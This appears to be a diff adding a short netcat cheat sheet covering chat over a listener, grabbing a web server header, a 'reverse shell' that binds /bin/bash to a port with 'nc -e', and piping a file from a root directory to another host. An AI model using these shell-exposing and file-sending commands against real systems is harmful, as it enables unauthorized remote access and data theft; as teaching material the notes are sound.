@@ -1,0 +1,49 @@
+NetCt
+
+//Unincrypted traffic
+//Enables reverse-shell
+//Enables File Transfer
+
+1 - Consult if '-e' / 'exec=PROGRAM' is enabled on your installation 
+$ nc -h
+
+:::::::::::::::::: :: Message-Transfer :: :::::::::::::::::::
+
+1 - Start a Listening server
+$ nc -l 9707
+
+2 - Start a client
+$ nc 127.0.0.1 9707
+
+3- Send Message from either client or server
+$ hello world!
+
+:::::::::::::::::: :: Grab Website Header :: :::::::::::::::::::
+
+1 - $ nmap www.google.com
+
+2 - $ nc 216.58.208.110 80
+3 - $ HEAD / HTTP/1.0
+
+
+:::::::::::::::::: :: Reverse-Shell :: :::::::::::::::::::
+
+1 - Start a Listening server 
+it pipes any message recieved through /bash making it behave like a command
+$ nc -l -p 9707 -e /bin/bash
+
+2 - Connect to server
+$ nc 172.0.0.1 9707
+
+
+:::::::::::::::::: :: File-Transfer :: :::::::::::::::::::
+
+
+1 - Start a listening server that is
+ready to output the data it recieves to a a file of a
+similar type to the expected file being recieved
+$ nc -l -p 9707 > text.txt
+
+
+2 - Send file contents
+$ cat 'root/try.txt' | nc 172.0.0.1 9707
